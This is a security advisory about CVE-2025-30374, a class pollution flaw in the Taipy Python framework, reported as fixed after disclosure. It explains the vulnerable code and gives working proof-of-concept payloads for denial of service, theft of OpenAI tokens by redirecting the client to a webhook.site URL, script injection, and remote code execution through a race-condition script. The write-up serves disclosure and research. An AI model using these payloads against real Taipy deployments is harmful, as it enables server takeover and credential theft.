---
title: "Taipy"
weight: 3
---

# Taipy (CVE-2025-30374)

**Taipy** is a popular Python framework for building data applications (19.2K stars), widely used in ML/AI workflows.

| Field | Value |
|-------|-------|
| Repository | [Avaiga/taipy](https://github.com/Avaiga/taipy) |
| Version | v4.0.3 |
| CVE | CVE-2025-30374 |
| Type | Constrained-Get × Attr-Set |
| Input | Remote (WebSocket) |
| Status | Fixed |

## Summary

We identified a class pollution vulnerability in Taipy that allows attackers to overwrite the Taipy runtime context, leading to severe consequences including RCE, Reflected XSS, Denial of Service (DoS), and leakage of sensitive authorization credentials (e.g., OpenAI tokens).

## Vulnerability

The root cause lies in Taipy's use of a recursive set function to update variable values in Taipy states. Both the `name` and `value` parameters are derived from client-side input and lack proper validation. This allows an attacker to inject malicious input, such as `_TpN_tpec_TpExPr_value_TPMDL_2.__class__.__base__.set`, to overwrite the `set` method of `_TaipyBase`.

The following functions are invoked in multiple routes via `_manage_message` to update states from the client side:

[`taipy/gui/utils/_attributes.py`](https://github.com/Avaiga/taipy/blob/5c56f125a2bab02a260eee88503ee480ac933f7e/taipy/gui/utils/_attributes.py#L37-L42):

```python
def _attrsetter(obj: object, attr_str: str, value: object) -> None:
    var_name_split = attr_str.split(sep=".")
    for i in range(len(var_name_split) - 1):
        sub_name = var_name_split[i]
        obj = getattr(obj, sub_name)        # Constrained: getattr only
    setattr(obj, var_name_split[-1], value)  # Attr-Set only
```

[`taipy/gui/utils/_attributes.py`](https://github.com/Avaiga/taipy/blob/5c56f125a2bab02a260eee88503ee480ac933f7e/taipy/gui/utils/_attributes.py#L53-L58):

```python
def _setscopeattr_drill(obj: object, attr_str: str, value: object) -> None:
    var_name_split = attr_str.split(sep=".")
    for i in range(len(var_name_split) - 1):
        sub_name = var_name_split[i]
        obj = getattr(obj, sub_name)
    setattr(obj, var_name_split[-1], value)
```

The functions:
1. Split the attacker-controlled `attr_str` by dots
2. Resolve each segment via `getattr` (Constrained-Get)
3. Set the final attribute with `setattr` (Attr-Set)

No validation is performed on the attribute path.

## PoC

### Consequence 1: DoS

[Video PoC](https://drive.google.com/file/d/1BESvtyaJyEOp0BkeFdZFdwj83_E9wp18/view)

**Steps:**

1. Set up the tutorial case from the [Taipy Getting Started Guide](https://docs.taipy.io/en/latest/tutorials/getting_started/) at `http://localhost:5000`.
2. Visit the page, intercept the WebSocket request, and replace the `name` field with `_TpN_tpec_TpExPr_value_TPMDL_2.__class__.__base__.set`. This overwrites the `set` method of `_TaipyBase` with a non-callable integer.

```json
["message",{"type":"U","name":"_TpN_tpec_TpExPr_value_TPMDL_2.__class__.__base__.set","payload":{"value":71,"on_change":"slider_moved"},"propagate":true,"client_id":"20250313210404484031-0.3099351422929606","ack_id":"Li_DKilnNL_N2AILnmFsD","module_context":"__main__"},null]
```

3. Refresh the page and observe that dragging the slider causes the application to crash.

**Effect**: `_TaipyBase.set` is overwritten with a non-callable integer. Any subsequent state update operation raises `TypeError`, making the application completely unusable for all users.

---

### Consequence 2: OpenAI Token Leakage

[Video PoC](https://drive.google.com/file/d/1uXiHpO-SzE1jhHzMRCTZo9CSOZHORTmT/view)

**Steps:**

1. Set up the LLM ChatBot example from the [Taipy ChatBot Tutorial](https://docs.taipy.io/en/latest/tutorials/articles/chatbot/) at `http://localhost:5000`. The source code can be found [here](https://github.com/Avaiga/demo-chatbot).
2. Visit the page, send a message (e.g., "hello"), and intercept the WebSocket request. Replace the `name` field with `client.base_url` and the `value` field with an attacker-controlled domain. This step may require multiple attempts to succeed.

```json
["message",{"type":"U","name":"client.base_url","payload":{"value":"https://webhook.site/0df4ac02-0b20-4ffc-bbda-287da8bc8a0a"},"propagate":true,"client_id":"20250315152148416630-0.5672333200699874","ack_id":"8OBXzCgeNv_DDW4MGpgnW","module_context":"__main__"},null]
```

3. Send additional messages and observe that requests intended for OpenAI are redirected to the attacker's server, along with the associated OpenAI token.

**Effect**: The attacker-controlled `base_url` causes all subsequent API calls (including the `Authorization: Bearer <token>` header) to be sent to the attacker's server, leaking the OpenAI API key.

---

### Consequence 3: XSS

<img src="/wiki/img/taipy-xss.gif" alt="Taipy XSS via class pollution" width="100%">

In [`taipy/gui/gui.py`](https://github.com/Avaiga/taipy/blob/439c7f52253fc09dd41c455a8a9f8da962d49dfa/taipy/gui/gui.py#L542-L546), when the application attempts to render user content, if the content provider is not found, it falls back to returning `type(content).__name__` as the HTML response:

```python
def _get_user_content_url(self, ...):
    ...
    if provider is None:
        return type(content).__name__
```

However, the `__name__` attribute of a class object is settable through class pollution, e.g., `tp_TpExPr_gui_get_adapted_lov_past_conversations_NoneType_TPMDL_2_0.__class__.__name__`. An attacker can overwrite this attribute with a malicious HTML or JavaScript payload.

**Exploit:**

```python
pollute(
    "tp_TpExPr_gui_get_adapted_lov_past_conversations_NoneType_TPMDL_2_0.__class__.__name__",
    "<script>alert(document.domain)</script>"
)
```

**Effect**: The attacker's script is injected into pages served to users who trigger the content rendering path.

---

### Consequence 4: RCE

<img src="/wiki/img/taipy-rce.gif" alt="Taipy RCE via class pollution" width="100%">

The class pollution vulnerability allows attackers to set arbitrary attributes on objects that appear in the session state. We found that the `Gui.on_action` route can be leveraged to invoke the `Gui.table_on_edit` method, which allows new objects from the `__main__` module to be bound into the session state. In [`taipy/gui/gui.py`](https://github.com/Avaiga/taipy/blob/439c7f52253fc09dd41c455a8a9f8da962d49dfa/taipy/gui/gui.py#L1872), a `getattr` call on the state object automatically triggers the binding operation, while a subsequent `setattr` immediately resets the bound value to `None`:

```python
setattr(state, var_name, None)  # briefly binds the object before resetting
```

This behavior creates a brief race window where object references, such as the `Gui` class, temporarily exist in the session state. During this window, attackers can exploit class pollution to overwrite attributes on those objects.

We further discovered that the `Gui.__SELF_VAR` attribute is used as a prefix when constructing expressions passed to Python's built-in `eval()` function in [`taipy/gui/utils/_evaluator.py`](https://github.com/Avaiga/taipy/blob/439c7f52253fc09dd41c455a8a9f8da962d49dfa/taipy/gui/utils/_evaluator.py#L265):

```python
expr = f"{self.__SELF_VAR}.{expression}"
eval(expr, ...)
```

By overwriting the `__SELF_VAR` value through class pollution, an attacker can control the expression that gets evaluated, ultimately leading to arbitrary code execution on the server.

**Exploit (race condition):**

```python
def run_race():
    num_pollute = 300
    barrier = threading.Barrier(num_pollute + 1)

    threads = []
    for i in range(num_pollute):
        payload = "__import__('os').system('touch /tmp/pwned')"
        t = threading.Thread(
            target=pollute_race,
            args=(f"Gui._Gui__SELF_VAR", payload)
        )
        threads.append(t)
        t.start()

    t_overwrite = threading.Thread(target=overwrite_race, args=("Gui",))
    threads.append(t_overwrite)
    t_overwrite.start()

    barrier.wait()
```

**Effect**: Arbitrary shell command execution as the Taipy server process user.

## Impact

Any user of Taipy can exploit this vulnerability to launch RCE, Reflected XSS, Denial of Service (DoS), and leakage of sensitive authorization credentials (e.g., OpenAI tokens). The WebSocket endpoint is accessible to any user, making this a remote-triggerable vulnerability. Taipy Enterprise promptly patched the issue after responsible disclosure.

## Proof of Concept

[`cp-collection/taipy/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/taipy/poc)
&mdash; runnable exploit environment with `run.sh` and `requirements.txt`.

Full exploit scripts:
- [RCE exploit](https://gist.github.com/jackfromeast/df377c20520c101ab61111b8f6da6583#file-rce-py)
- [XSS exploit](https://gist.github.com/jackfromeast/df377c20520c101ab61111b8f6da6583#file-xss-py)

